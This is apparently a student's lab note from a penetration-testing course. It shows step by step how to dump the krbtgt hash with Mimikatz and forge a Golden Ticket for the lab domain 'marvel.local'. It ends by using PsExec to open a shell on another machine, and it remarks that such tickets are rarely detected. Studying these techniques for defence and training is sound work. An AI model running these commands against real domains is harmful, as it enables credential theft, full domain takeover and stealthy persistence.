**MIMIKATZ - Golden Ticket**
GOLDEN TICKET<br/>
<br/>
If you crack the has to the KTGT ssytem... you can create the ticktets...<br/>
<br/>
Look at me &gt;&gt;&gt; im the TGT service now<br/>
<br/>
<br/>
Golden ticket == complete domain access<br/>
<br/>
<br/>
we are targeting the krbtgt account so lasdum &gt;&gt; on that account<br/>
<br/>
open mimkatz<br/>
<br/>
do privilege debug<br/>
privilege::debug<br/>
<br/>
syntax &gt; lsadump::lsa /inject /name:krbtgt<br/>
<br/>
<img src="image.png"/><br/>
<br/>
<br/>
<br/>
Details need from dump <br/>
<br/>
SID of domain - S-1-5-21-1431682622-4063751855-3734642212<br/>
<br/>
NTLM hash - 5fba49546608a57d9f69f8b0fe18e762<br/>
<br/>
Syntax &gt;&gt; kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1431682622-4063751855-3734642212 krbtgt:5fba49546608a57d9f69f8b0fe18e762 /id:500 /ptt<br/>
<br/>
<br/>
Kerberos - module<br/>
golden - using<br/>
user - any name admin looks good<br/>
domain - you need the domain name<br/>
sid - the SID from the dump<br/>
krbtgt - from the dump<br/>
id - 500 = admin<br/>
ptt - pass the ticket passes it along to next session<br/>
<br/>
<br/>
<br/>
<br/>
change from course material and based on newer version on mimkatz used<br/>
<br/>
https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html<br/>
<br/>
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1431682622-4063751855-3734642212 /rc4:5fba49546608a57d9f69f8b0fe18e762 /aes256 /id:500 /ptt<br/>
<br/>
I had to run the above command.. using RC4 instead of krbntgt<br/>
<br/>
<br/>
<img src="image 2.png"/><br/>
<br/>
<br/>
Now we can take the ticket to a new session<br/>
<br/>
misc::cmd<br/>
<br/>
we acan attempt to acces the directory of another machine &gt;&gt;&gt; WOLVERINE<br/>
<br/>
syntax &gt;&gt; dir \\WOLVERINE\c$<br/>
<br/>
*facepalm &gt; it would help if the machine was still online<br/>
<br/>
<img src="image 3.png"/><br/>
<br/>
<br/>
Golden ticket &gt;&gt; persistance.. not usually detected.. BUt Silver ticket!!! new and sneaky<br/>
<br/>
<br/>
PsExec.exe \\WOLVERINE cmd.exe<br/>
<br/>
got me a shell<br/>
<br/>
before<br/>
<img src="image 4.png"/><br/>
<br/>
after<br/>
<img src="image 5.png"/><br/>
<br/>
<br/>
<img src="image 6.png"/><br/>
<br/>
Psexec 64 did not work?? but 32 did! go figure<br/>
<br/>
<br/>
